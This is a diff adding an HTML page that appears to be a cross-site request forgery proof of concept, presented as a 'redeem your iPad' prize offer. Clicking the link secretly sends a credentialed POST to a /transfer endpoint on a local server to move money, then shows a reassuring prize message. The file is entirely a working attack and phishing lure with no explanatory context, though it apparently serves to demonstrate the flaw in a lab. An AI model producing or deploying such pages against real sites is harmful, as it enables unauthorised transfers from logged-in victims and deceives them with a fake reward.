@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redeem Your iPad</title>
+</head>
+<body>
+    <h1>Congratulations! Click the link below to redeem your iPad!</h1>
+    <a href="#" id="redeem-link">Redeem your iPad</a>
+
+    <script>
+        document.getElementById('redeem-link').addEventListener('click', function() {
+            fetch('http://127.0.0.1:4000/transfer', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                credentials: 'include',
+                body: JSON.stringify({ amount: 100 })
+            }).then(response => {
+                if (response.ok) {
+                    alert('Your iPad is being processed!');
+                } else {
+                    alert('Failed to redeem iPad.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
